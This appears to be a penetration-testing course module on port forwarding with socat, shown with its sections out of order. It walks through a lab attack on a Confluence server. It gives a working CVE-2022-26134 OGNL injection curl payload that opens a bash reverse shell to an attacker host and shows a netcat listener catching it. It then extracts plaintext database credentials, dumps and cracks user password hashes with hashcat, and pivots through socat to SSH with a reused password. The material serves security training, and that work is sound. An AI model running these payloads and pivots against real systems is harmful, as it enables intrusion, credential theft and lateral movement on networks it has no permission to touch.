
The URL path is an _OGNL injection_ payload. OGNL is [_Object-Graph Notation Language_](https://en.wikipedia.org/wiki/OGNL), an expression language commonly used in Java applications. OGNL injection can take place when an application handles user input in such a way that it gets passed to the OGNL expression parser. Since it's possible to execute Java code within OGNL expressions, OGNL injection can be used to execute arbitrary code.

The OGNL injection payload itself uses Java's [_ProcessBuilder_](https://docs.oracle.com/javase/7/docs/api/java/lang/ProcessBuilder.html) class to spawn a _Bash_ interactive reverse shell (_bash -i_).

This proof-of-concept payload is almost perfect for our needs. However, we need to modify it before we can use it. This is for two reasons. First, the Confluence server that the payload is pointing to in the original payload is not where our vulnerable Confluence server is. Second, the Bash reverse shell payload is pointing at port 1270 on 10.0.0.28, which is not where our Kali machine is. We need to modify these parameters in the payload before we can reuse it to exploit CONFLUENCE01 and return a shell to our own Kali machine.

While making these modifications, we also need to take the URL encoding into account. The payload string in the proof-of-concept isn't completely URL encoded. Certain characters (notably ".", "-" and "/") are not encoded. Although it's not always the case, for _this_ exploit, this turns out to be important to the functioning of the payload. If any of these characters are encoded, the server will parse the URL differently, and the payload may not execute. This means we can't apply URL encoding across the whole payload once we've modified it.

Keeping this in mind, we'll manually modify the parameters we need, using the original proof-of-concept payload as our base. We can change the Confluence server IP to **192.168.50.63**, and the Bash interactive shell payload IP and port to a listener we're going to open on our Kali machine (**/dev/tcp/192.168.118.4/4444**). We'll also remove the **curl** verbosity flag. This leaves us with the following modified payload:

```
curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.118.4/4444%200%3E%261%27%29.start%28%29%22%29%7D/
```

> Listing 3 - The modified payload.

Now that our payload is customized for our use, we can start a [_Netcat_](https://en.wikipedia.org/wiki/Netcat) listener on our Kali machine on TCP port 4444.

```
kali@kali:~$ nc -nvlp 4444
listening on [any] 4444 ...
```

> Listing 4 - Starting Netcat listener on port 4444 on our Kali machine.

With our listener running, we'll open another shell on our Kali machine, then run the **curl** command we just constructed.

```
kali@kali:~$ curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.118.4/4444%200%3E%261%27%29.start%28%29%22%29%7D/

kali@kali:~$ 
```

> Listing 5 - Executing the modified reverse shell payload.

The command itself doesn't return anything, but the reverse shell is caught by our listener.

```
...
listening on [any] 4444 ...
connect to [192.168.118.4] from (UNKNOWN) [192.168.50.63] 55876
bash: cannot set terminal process group (813): Inappropriate ioctl for device
bash: no job control in this shell
confluence@confluence01:/opt/atlassian/confluence/bin$ id
id
uid=1001(confluence) gid=1001(confluence) groups=1001(confluence)
```

> Listing 6 - Bash reverse shell caught by our Netcat listener, and confirmed with the id command.

The **id** command confirms that this shell is running with the privileges of the _confluence_ user. This user has quite limited privileges. Regardless, we now have a reverse shell from CONFLUENCE01 to our Kali machine.

We can now start some light enumeration of CONFLUENCE01 using our new shell. We'll check the network interfaces using **ip addr**.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ ip addr
ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:50:56:8a:54:46 brd ff:ff:ff:ff:ff:ff
    inet 192.168.50.63/24 brd 192.168.50.255 scope global ens192
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:fe8a:5446/64 scope link 
       valid_lft forever preferred_lft forever
3: ens224: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:50:56:8a:c2:c9 brd ff:ff:ff:ff:ff:ff
    inet 10.4.50.63/24 brd 10.4.50.255 scope global ens224
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:fe8a:c2c9/64 scope link 
       valid_lft forever preferred_lft forever
```

> Listing 7 - Enumerating network interfaces on CONFLUENCE01.

The output shows us that CONFLUENCE01 has two network interfaces: _ens192_ and _ens224_. _ens192_ has the IP address 192.168.50.63, and _ens224_ has the IP address 10.4.50.63. We can then check the routes using **ip route**.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ ip route
ip route
default via 192.168.50.254 dev ens192 proto static 
10.4.50.0/24 dev ens224 proto kernel scope link src 10.4.50.63 
10.4.50.0/24 via 10.4.50.254 dev ens224 proto static
192.168.50.0/24 dev ens192 proto kernel scope link src 192.168.50.63
```

> Listing 8 - Enumerating routes on CONFLUENCE01.

The command shows us that we should be able to access hosts in the 192.168.50.0/24 subnet through the _ens192_ interface, and hosts in the 10.4.50.0/24 subnet through the _ens224_ interface.

Continuing our enumeration, we'll find the Confluence configuration file at **/var/atlassian/application-data/confluence/confluence.cfg.xml**. While reading the contents using **cat**, we discover some plaintext database credentials located within.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ cat /var/atlassian/application-data/confluence/confluence.cfg.xml
<sian/application-data/confluence/confluence.cfg.xml   
<?xml version="1.0" encoding="UTF-8"?>

<confluence-configuration>
  <setupStep>complete</setupStep>
  <setupType>custom</setupType>
  <buildNumber>8703</buildNumber>
  <properties>
...
    <property name="hibernate.connection.password">D@t4basePassw0rd!</property>
    <property name="hibernate.connection.url">jdbc:postgresql://10.4.50.215:5432/confluence</property>
    <property name="hibernate.connection.username">postgres</property>
...
  </properties>
</confluence-configuration>
confluence@confluence01:/opt/atlassian/confluence/bin$ 
```

> Listing 9 - The credentials found in the Confluence confluence.cfg.xml file on CONFLUENCE01.

We'll find the IP address of the database server, as well as the plain text username and password used to connect to it. We can use these credentials to authenticate to the database and continue our enumeration.

We've hit a limitation, however. CONFLUENCE01 doesn't have a PostgreSQL client installed on it. Since we are running as the low-privileged _confluence_ user, we are also unable to easily install software.

We _do_ have the PostgreSQL client _psql_ installed on our Kali machine, but we can't connect directly to PGDATABASE01 from our Kali machine, since it's only routable from CONFLUENCE01.

In this scenario, there is no firewall in place between our Kali machine and CONFLUENCE01, meaning that there is nothing stopping us from binding ports on the WAN interface of CONFLUENCE01 and connecting to them from our Kali machine.

This is exactly the type of situation in which port forwarding can be useful. We can create a port forward on CONFLUENCE01 that listens on a port on the WAN interface, then forward all packets received on this port to the PGDATABASE01 on the internal subnet. In the next section, we will use [_Socat_](http://www.dest-unreach.org/socat/doc/socat.html) to achieve this.

## 19.2.3. Port Forwarding with Socat

Now we are ready to create a port forward. We have an idea of how we want it to work: CONFLUENCE01 should listen on a port on the WAN interface and forward all packets received on this port to the PGDATABASE01 on the internal subnet. This concept is illustrated in the following diagram:

![Figure 2: The way we expect our port forward to work](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/0821666b2826564e07661eba0550c37a-PRAT2_1_1_PortForwardPlan.png)

Figure 2: The way we expect our port forward to work

We want to open TCP port 2345 on the WAN interface of CONFLUENCE01, then connect to that port from our Kali machine. We want all the packets that we send to this port to be forwarded by CONFLUENCE01 to TCP port 5432 on PGDATABASE01. Once we set up our port forward, connecting to TCP port 2345 on CONFLUENCE01 will be exactly like connecting directly to TCP port 5432 on PGDATABASE01.

As part of our enumeration of CONFLUENCE01, we'll find Socat installed. Socat is a general-purpose networking tool that can set up a simple port forward in a single command.

In this scenario, we find it already installed, but Socat does not tend to be installed by default on \*NIX systems. If not already installed, it's possible to download and run a statically linked binary version instead.

We will use Socat to configure the desired port forward on CONFLUENCE01. It will listen on a port on the WAN interface (that our Kali machine can connect to) and forward packets received on that port to PGDATABASE01.

On CONFLUENCE01, we'll start a verbose (**\-ddd**) Socat process. It will listen on TCP port 2345 (**TCP-LISTEN:2345**), fork into a new subprocess when it receives a connection (**fork**) instead of dying after a single connection, then forward all traffic it receives to TCP port 5432 on PGDATABASE01 (**TCP:10.4.50.215:5432**).

We'll listen on port 2345 since it is outside the privileged port range (0-1024), meaning elevated privileges are not required.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432
<ocat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432   
2022/08/18 10:12:01 socat[46589] I socat by Gerhard Rieger and contributors - see www.dest-unreach.org
2022/08/18 10:12:01 socat[46589] I This product includes software developed by the OpenSSL Project for use in the OpenSSL Toolkit. (http://www.openssl.org/)
2022/08/18 10:12:01 socat[46589] I This product includes software written by Tim Hudson (tjh@cryptsoft.com)
2022/08/18 10:12:01 socat[46589] I setting option "fork" to 1
2022/08/18 10:12:01 socat[46589] I socket(2, 1, 6) -> 5
2022/08/18 10:12:01 socat[46589] I starting accept loop
2022/08/18 10:12:01 socat[46589] N listening on AF=2 0.0.0.0:2345
```

> Listing 10 - Running the Socat port forward command.

The network is now set up like the following diagram:

![Figure 3: Socat in place as our port forwarder](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/eb1577c7ae460992abbeee4839ffb4e3-PRAT2_1_3_PortForwardSocat.png)

Figure 3: Socat in place as our port forwarder

With the Socat process running, we can run **psql** on our Kali machine, specifying that we want to connect to CONFLUENCE01 (**\-h 192.168.50.63**) on port 2345 (**\-p 2345**) with the _postgres_ user account (**\-U postgres**). When prompted, we will enter the password, and once connected, we can run the **\\l** command to list the available databases.

```
kali@kali:~$ psql -h 192.168.50.63 -p 2345 -U postgres
Password for user postgres: 
psql (14.2 (Debian 14.2-1+b3), server 12.11 (Ubuntu 12.11-0ubuntu0.20.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
Type "help" for help.

postgres=# \l
                                  List of databases
    Name    |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges   
------------+----------+----------+-------------+-------------+-----------------------
 confluence | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 postgres   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 template0  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
            |          |          |             |             | postgres=CTc/postgres
 template1  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
            |          |          |             |             | postgres=CTc/postgres
(4 rows)
```

> Listing 11 - Connecting to the PGDATABASE01 PostgreSQL service and listing databases using psql, through our port forward.

Success! We've connected to the PostgreSQL database through our port forward. We'll also find that we have access to the _confluence_ database.

Using our new database access, we can continue our enumeration. In the confluence database, let's query the _cwd\_user_ table. This contains the username and password hashes for all Confluence users. We'll connect to the database with the **\\c confluence** command, then run **select \* from cwd\_user;** to review everything in that table.

```
postgres=# \c confluence
psql (14.2 (Debian 14.2-1+b3), server 12.11 (Ubuntu 12.11-0ubuntu0.20.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
You are now connected to database "confluence" as user "postgres".

confluence=# select * from cwd_user;

   id    |   user_name    | lower_user_name | active |      created_date       |      updated_date       | first_name | lower_first_name |   last_name   | lower_last_name |      display_name      |   lower_display_name   |           email_address            |        lower_email_address         |             external_id              | directory_id |                                credential                                 
---------+----------------+-----------------+--------+-------------------------+-------------------------+------------+------------------+---------------+-----------------+------------------------+------------------------+------------------------------------+------------------------------------+--------------------------------------+--------------+---------------------------------------------------------------------------
  458753 | admin          | admin           | T      | 2022-08-17 15:51:40.803 | 2022-08-17 15:51:40.803 | Alice      | alice            | Admin         | admin           | Alice Admin            | alice admin            | alice@industries.internal          | alice@industries.internal          | c2ec8ebf-46d9-4f5f-aae6-5af7efadb71c |       327681 | {PKCS5S2}WbziI52BKm4DGqhD1/mCYXPl06IAwV7MG7UdZrzUqDG8ZSu15/wyt3XcVSOBo6bC
 1212418 | trouble        | trouble         | T      | 2022-08-18 10:31:48.422 | 2022-08-18 10:31:48.422 |            |                  | Trouble       | trouble         | Trouble                | trouble                | trouble@industries.internal        | trouble@industries.internal        | 164eb9b5-b6ef-4c0f-be76-95d19987d36f |       327681 | {PKCS5S2}A+U22DLqNsq28a34BzbiNxzEvqJ+vBFdiouyQg/KXkjK0Yd9jdfFavbhcfZG1rHE
 1212419 | happiness      | happiness       | T      | 2022-08-18 10:33:49.058 | 2022-08-18 10:33:49.058 |            |                  | Happiness     | happiness       | Happiness              | happiness              | happiness@industries.internal      | happiness@industries.internal      | b842163d-6ff5-4858-bf54-92a8f5b28251 |       327681 | {PKCS5S2}R7/ABMLgNl/FZr7vvUlCPfeCup9dpg5rplddR6NJq8cZ8Nqq+YAQaHEauk/HTP49
 1212417 | database_admin | database_admin  | T      | 2022-08-18 10:24:34.429 | 2022-08-18 10:24:34.429 | Database   | database         | Admin Account | admin account   | Database Admin Account | database admin account | database_admin@industries.internal | database_admin@industries.internal | 34901af8-b2af-4c98-ad1d-f1e7ed1e52de |       327681 | {PKCS5S2}QkXnkmaBicpsp0B58Ib9W5NDFL+1UXgOmJIvwKjg5gFjXMvfeJ3qkWksU3XazzK0
 1212420 | hr_admin       | hr_admin        | T      | 2022-08-18 18:39:04.59  | 2022-08-18 18:39:04.59  | HR         | hr               | Admin         | admin           | HR Admin               | hr admin               | hr_admin@industries.internal       | hr_admin@industries.internal       | 2f3cc06a-7b08-467e-9891-aaaaeffe56ea |       327681 | {PKCS5S2}EiMTuK5u8IC9qGGBt5cVJKLu0uMz7jN21nQzqHGzEoLl6PBbUOut4UnzZWnqCamV
 1441793 | rdp_admin      | rdp_admin       | T      | 2022-08-20 20:46:03.325 | 2022-08-20 20:46:03.325 | RDP        | rdp              | Admin         | admin           | RDP Admin              | rdp admin              | rdp_admin@industries.internal      | rdp_admin@industries.internal      | e9a9e0f5-42a2-433a-91c1-73c5f4cc42e3 |       327681 | {PKCS5S2}skupO/gzzNBHhLkzH3cejQRQSP9vY4PJNT6DrjBYBs23VRAq4F5N85OAAdCv8S34
(6 rows)

(END)
```

> Listing 12 - The contents of the cwd\_user table in the confluence database.

We obtain multiple rows of user data. Each row contains data for a single Confluence user, including their password hash. We will use [_Hashcat_](https://hashcat.net/hashcat/) to try to crack these.

The [Hashcat mode number](https://hashcat.net/wiki/doku.php?id=example_hashes) for _Atlassian (PBKDF2-HMAC-SHA1)_ hashes is _12001_, so we can pass that to the **\-m** mode flag. After copying the hashes into a file called **hashes.txt**, we'll pass this as the first positional argument. We can then pass the **fastrack.txt** password list that's built into Kali as the final positional argument.

```
kali@kali:~$ hashcat -m 12001 hashes.txt /usr/share/wordlists/fasttrack.txt 
hashcat (v6.2.5) starting

OpenCL API (OpenCL 2.0 pocl 1.8  Linux, None+Asserts, RELOC, LLVM 11.1.0, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=====================================================================================================================================
* Device #1: pthread-11th Gen Intel(R) Core(TM) i7-11800H @ 2.30GHz, 2917/5899 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

...

{PKCS5S2}skupO/gzzNBHhLkzH3cejQRQSP9vY4PJNT6DrjBYBs23VRAq4F5N85OAAdCv8S34:P@ssw0rd!
{PKCS5S2}QkXnkmaBicpsp0B58Ib9W5NDFL+1UXgOmJIvwKjg5gFjXMvfeJ3qkWksU3XazzK0:sqlpass123
{PKCS5S2}EiMTuK5u8IC9qGGBt5cVJKLu0uMz7jN21nQzqHGzEoLl6PBbUOut4UnzZWnqCamV:Welcome1234
...
```

> Listing 13 - Hashcat having cracked the database\_admin, hr\_admin and rdp\_admin account hashes.

It appears that the password policy for this Confluence instance isn't very strong. After only a few minutes of cracking, Hashcat returns passwords for the _database\_admin_, _hr\_admin_ and _rdp\_admin_ users.

We might suspect that these passwords are reused in other places throughout the network. After some more enumeration of the internal network, we'll find PGDATABASE01 is also running an SSH server. Let's try these credentials against this SSH server. With our new port forwarding skill, we can create a port forward on CONFLUENCE01 that will allow us to SSH directly from our Kali machine to PGDATABASE01.

First, we need to kill the original Socat process listening on TCP port 2345. We'll then create a new port forward with Socat that will listen on TCP port 2222 and forward to TCP port 22 on PGDATABASE01.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22
</bin$ socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22 

```

> Listing 14 - Creating a new port forward with Socat to access the SSH service on PGDATABASE01.

With our new Socat port forward set up, our network setup will be configured much like the following diagram:

![Figure 4: Using Socat to open a port forward from CONFLUENCE01 to the SSH server on PGDATABASE01](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/ae6bb27852f848e8c26cbb2eb12443fb-PRAT2_1_4_PortForwardSocatSSH.png)

Figure 4: Using Socat to open a port forward from CONFLUENCE01 to the SSH server on PGDATABASE01

There are only very minimal differences between this and the previous network setup. Instead of listening on 2345, we are listening on 2222. Instead of forwarding to TCP port 5432 on PGDATABASE01, we are forwarding to TCP port 22 on PGDATABASE01.

We'll then use our SSH client to connect to port 2222 on CONFLUENCE01, as though we are connecting directly to port 22 on PGDATABASE01. We can use the _database\_admin_ user, and the password we just cracked using Hashcat.

```
kali@kali:~$ ssh database_admin@192.168.50.63 -p2222
The authenticity of host '[192.168.50.63]:2222 ([192.168.50.63]:2222)' can't be established.
ED25519 key fingerprint is SHA256:3TRC1ZwtlQexLTS04hV3ZMbFn30lYFuQVQHjUqlYzJo.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[192.168.50.63]:2222' (ED25519) to the list of known hosts.
database_admin@192.168.50.63's password: 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-122-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 18 Aug 2022 11:43:07 AM UTC

  System load:  0.1               Processes:               241
  Usage of /:   59.3% of 7.77GB   Users logged in:         1
  Memory usage: 16%               IPv4 address for ens192: 10.4.50.215
  Swap usage:   0%                IPv4 address for ens224: 172.16.50.215


0 updates can be applied immediately.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

database_admin@pgdatabase01:~$
```

> Listing 15 - Connecting to SSH server on PGDATABASE01, through the port forward on CONFLUENCE01.

Success! The **database\_admin** credentials have been reused here. We have managed to connect to the SSH server on PGDATABASE01 using the credentials for _database\_admin_ we found in the PostgreSQL database through the port forward we set up on CONFLUENCE01 with Socat.

In this Learning Unit, we created some simple port forwards using Socat. These allowed us to gain deeper access within a network by leveraging our existing access to a compromised host.

It should also be noted that Socat is not the only way to create port forwards on \*NIX hosts. There are several alternatives, of note:

-   [_rinetd_](https://github.com/samhocevar/rinetd) is an option that runs as a daemon. This makes it a better solution for longer-term port forwarding configurations but is slightly unwieldy for temporary port forwarding solutions.
    
-   We can combine Netcat and a [_FIFO_](https://man7.org/linux/man-pages/man7/fifo.7.html) named pipe file to create a [port forward](https://gist.github.com/holly/6d52dd9addd3e58b2fd5).
    
-   If we have root privileges, we could use iptables to create port forwards. The specific iptables port forwarding setup for a given host will likely depend on the configuration already in place. To be able to forward packets in Linux also requires enabling forwarding on the interface we want to forward on by writing "1" to **/proc/sys/net/ipv4/conf/\[interface\]/forwarding** (if it's not already configured to allow it).
    

## Resources

Some of the labs require you to start the target machine(s) below.

Please note that the IP addresses assigned to your target machines may not match those referenced in the Module text and video.

Port Redirection and SSH Tunneling - Port Forwarding with Socat - VM Group

#### Labs

1.  Follow the steps in this section to set up a port forward and gain access to the _confluence_ database on PGDATABASE01 using **psql** from your Kali machine. Crack the password of the _database\_admin_ user. What is the plain text password of this account?

Answer

# 19\. Port Redirection and SSH Tunneling

In this Learning Module, we will cover the following Learning Units:

-   Port Forwarding on \*NIX and Windows Machines
-   SSH Tunneling on (and between) \*NIX and Windows Machines

## 19.1. Why Port Redirection and Tunneling?

This Learning Unit covers the following Learning Objectives:

-   Understand the difference between common network layouts
-   Consider the impact of common network security devices
-   Understand when to use port redirection and tunneling techniques

Most network environments are not -and should not be- [_flat_](https://en.wikipedia.org/wiki/Flat_network), In a flat network, all devices are able to communicate freely with each other. There is little (or no) attempt to limit the access that each device has to other devices on the same network, regardless of whether devices need to communicate during normal operations.

Flat network topology is generally considered poor security practice. Once an attacker has access to a single host, they can start communicating with every other host. From there, it will be much easier to spread through the network and start compromising other hosts.

A more securely designed network type is [_segmented_](https://en.wikipedia.org/wiki/Network_segmentation).This type of network will be broken into smaller networks, each of which is called a [_subnet_](https://en.wikipedia.org/wiki/Subnetwork). Each subnet will contain a group of devices that have a specific purpose, and devices on that subnet are only granted access to other subnets and hosts when absolutely necessary. Network segmentation severely limits attackers, because compromising a single host no longer gives them free access to every other device on the network.

As part of the network segmentation process, most network administrators will also implement controls that limit the flow of traffic into, out from, and across their networks. To enforce this, they will deploy various technologies throughout the network.

One of the most common technologies used for this is [_Firewalls_](https://en.wikipedia.org/wiki/Firewall_(computing)). Firewalls can be implemented at the endpoint software level. For example, the _Linux kernel_ has firewall capabilities that can be configured with the [_iptables_](https://en.wikipedia.org/wiki/Iptables) tool suite, while Windows offers the built-in [_Windows Defender Firewall_](https://learn.microsoft.com/en-us/windows/security/threat-protection/windows-firewall/windows-firewall-with-advanced-security). Firewalls may also be implemented as features within a piece of physical network infrastructure. Administrators may even place a standalone _hardware firewall_ in the network, filtering all traffic.

Firewalls can drop unwanted inbound packets and prevent potentially malicious traffic from traversing or leaving the network. Firewalls may prevent all but a few allowed hosts from communicating with a port on a particularly privileged server. They can also block some hosts or subnets from accessing the wider _internet_.

Most firewalls tend to allow or block traffic in line with a set of rules based on _IP addresses_ and _port numbers_, so their functionality is limited. However, sometimes more fine-grained control is required. [_Deep Packet Inspection_](https://en.wikipedia.org/wiki/Deep_packet_inspection) monitors the contents of incoming and outgoing traffic and terminates it based on a set of rules.

Boundaries that are put in place by network administrators are designed to prevent the _arbitrary movement of data into, out of, and across the network_. But, as an attacker, these are exactly the boundaries we need to traverse. We'll need to develop strategies that can help us work around network restrictions as we find them.

_Port redirection_ (a term we are using to describe various types of [_port forwarding_](https://en.wikipedia.org/wiki/Port_forwarding)) and [_tunneling_](https://en.wikipedia.org/wiki/Tunneling_protocol) are both strategies we can use to traverse these boundaries. Port redirection modifies the data flow by redirecting packets from one socket to another. Tunneling means [_encapsulating_](https://en.wikipedia.org/wiki/Encapsulation_(networking)) one type of data stream within another, for example, transporting _Hypertext Transfer Protocol_ (HTTP) traffic within a _Secure Shell_ (SSH) connection (so from an external perspective, only the SSH traffic will be visible).

In this Module, we will introduce port redirection and tunneling techniques through practical examples. We'll ease in by starting with the lowest complexity techniques, and increase complexity as we move step-by-step towards more hardened network environments. Each new technique will be applied to a new network configuration that is slightly different than the previous. The only tunneling we cover in this Module is SSH tunneling, but we will cover more advanced methods in a later Module.

The [_logical topologies_](https://en.wikipedia.org/wiki/Network_topology) we create when chaining these strategies may initially be difficult to grasp. We will be making traffic move in ways that may not be initially intuitive. We should take the time to fully understand each technique before advancing to the next. By the end of this Module, we'll have all the tools required to manipulate the flow of traffic in any given network with surgical precision.

## 19.2. Port Forwarding with Linux Tools

This Learning Unit covers the following Learning Objectives:

1.  Understand what port forwarding is
2.  Learn when to use port forwarding techniques
3.  Use Socat to set up a port forward in Linux

Port forwarding is the most fundamental technique we will examine in this Module. It's also a technique that's very commonly used in general-purpose networking. When port forwarding, we configure a host to listen on one port and relay all packets received on that port to another destination.

In normal network conditions, a network administrator might create a port forward to allow access to a web server behind a firewall. In that case, they would configure the firewall to listen on a given port on one interface and pass all packets to the web server behind it.

Many home _routers_ also provide port forwarding functionality. These can be configured to listen on a port on the Internet-facing side of the router, then forward connections from that port to another device within the home network.

How might we use port forwarding in an attack chain? In the next section, we'll consider a simple scenario.

## 19.2.1. A Simple Port Forwarding Scenario

Let's examine a port forwarding scenario. During an assessment, we find a Linux web server running a version of [_Confluence_](https://www.atlassian.com/software/confluence) vulnerable to [_CVE-2022-26134_](https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html): a pre-authentication remote code execution issue. We can exploit this vulnerability and gain a reverse shell from the server.

During our enumeration, we find that this server has two _network interfaces_: one attached to the same network our Kali machine is also on (which allowed us to route to it directly), and another on an internal subnet. In the Confluence configuration file, we also find credentials and the IP address and port for a [_PostgreSQL_](https://www.postgresql.org/) database instance on a server in that internal subnet. We want to use these credentials to gain access to the database and enumerate further.

The following diagram illustrates our current understanding of the network layout.

![Figure 1: The network layout from our perspective so far](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/9f1e3efdc5c0256e854e387e50f5a621-PRAT2_1_0_ConfluenceAndDatabaseNetworkSetup.png)

Figure 1: The network layout from our perspective so far

One of the first things to notice about this diagram is that there are two named networks: the [_Wide Area Network_](https://en.wikipedia.org/wiki/Wide_area_network) (WAN) on the left and the [_Demilitarized Zone_](https://en.wikipedia.org/wiki/DMZ_(computing)) (DMZ) on the right. Our Kali machine is in the WAN, the PostgreSQL database server PGDATABASE01 is in the DMZ, and the Confluence server CONFLUENCE01 straddles both.

A WAN is a network that is large and expansive. Some people refer to the public internet as the largest WAN in the world, and some larger organizations will refer to their large internal network as a WAN, or internal WAN. In this case, since we're simulating an attack from an external network, the WAN represents a large corporate internal network, or the internet itself.

In this module’s exercises, our Kali machine will be positioned in the WAN We can route directly from our Kali machine only to hosts also on the WAN.

A DMZ is a network containing devices that may be more exposed to a wider, less trusted network. A DMZ helps create a buffer zone between hosts on the wider, less trusted network and internal hosts. In this way, it serves a similar function to a real-world [_Demilitarized zone_](https://en.wikipedia.org/wiki/Demilitarized_zone). In this scenario, the DMZ is the buffer network segment between the WAN and whatever other internal networks we may find.

CONFLUENCE01 is straddling both the WAN and DMZ to illustrate that it can communicate on both networks. CONFLUENCE01 is also listening on TCP port 8090, illustrated by the "open socket" attached to the icon.

PGDATABASE01 is within the DMZ network boundary; it does not straddle the WAN/DMZ. Our Kali machine is not in the DMZ, so we can't directly route to PGDATABASE01. PGDATABASE01 also has an "open socket" attached to it, illustrating that there's something listening on TCP port 5432 (this is likely a PostgreSQL server, since the default port is 5432).

Since the only thing we know about PGDATABASE01 so far is that it exists, we don't yet know if it's attached to any other networks. If later we find that PGDATABASE01 is attached to other networks, we will expand our network diagram.

With the credentials we found on CONFLUENCE01, we want to try to connect to this PostgreSQL port on PGDATABASE01 from our Kali machine.

Before getting into more detail, let's set up our lab environment to recreate the scenario we've described so far.

At the end of the _Port Forwarding with Socat_ section of this Learning Unit, a group of VMs are provided that can be used to follow along with the following sections. These VMs are provided so you can gain hands-on experience with all the techniques we cover. You can start the VM group at any point and follow along at whatever pace feels comfortable.

## 19.2.2. Setting Up the Lab Environment

To gain access to CONFLUENCE01, we need to leverage the command execution vulnerability in the Confluence web application to get a reverse shell. After discovering that the Confluence web application is vulnerable to CVE-2022-26134, we'll find a blog post from [_Rapid7_](https://www.rapid7.com/blog/post/2022/06/02/active-exploitation-of-confluence-cve-2022-26134/) that includes a [_cURL_](https://curl.se/) command containing a [_proof-of-concept_](https://en.wikipedia.org/wiki/Proof_of_concept) payload that claims to exploit the vulnerability and return a reverse shell.

```
curl -v http://10.0.0.28:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/10.0.0.28/1270%200%3E%261%27%29.start%28%29%22%29%7D/
```

> Listing 1 - The example payload from the Rapid7 blog post.

We don't run payloads without understanding exactly what they do, so we first need to figure out what's happening in this proof-of-concept.

The verbose (**\-v**) **curl** request is being made to **http://10.0.0.28:8090**, which we assume is the blogpost author's vulnerable Confluence server. After this, the URL [_path_](https://en.wikipedia.org/wiki/Uniform_Resource_Identifier#Syntax) looks more interesting. We observe that a lot of the characters in it are [_URL encoded_](https://en.wikipedia.org/wiki/Percent-encoding), so we need to _URL decode_ them to get a clearer sense of what the payload actually does.

You can quickly URL decode strings by selecting _Decode As..._ > _URL_ in the _Decoder_ tab in [_Burp_](https://portswigger.net/burp), or using an online tool such as [_CyberChef_](https://gchq.github.io/CyberChef/) If working with sensitive information in a real corporate environment, you should avoid pasting data into online tools. However, in this case we're decoding a proof-of-concept that's already public, so we can use online tools if necessary.

After URL decoding the path, the function of the payload is clearer.

```
/${new javax.script.ScriptEngineManager().getEngineByName("nashorn").eval("new java.lang.ProcessBuilder().command('bash','-c','bash -i >& /dev/tcp/10.0.0.28/1270 0>&1').start()")}/
```

> Listing 2 - The example payload URL-decoded.

The URL path is an _OGNL injection_ payload. OGNL is [_Object-Graph Notation Language_](https://en.wikipedia.org/wiki/OGNL), an expression language commonly used in Java applications. OGNL injection can take place when an application handles user input in such a way that it gets passed to the OGNL expression parser. Since it's possible to execute Java code within OGNL expressions, OGNL injection can be used to execute arbitrary code.

The OGNL injection payload itself uses Java's [_ProcessBuilder_](https://docs.oracle.com/javase/7/docs/api/java/lang/ProcessBuilder.html) class to spawn a _Bash_ interactive reverse shell (_bash -i_).

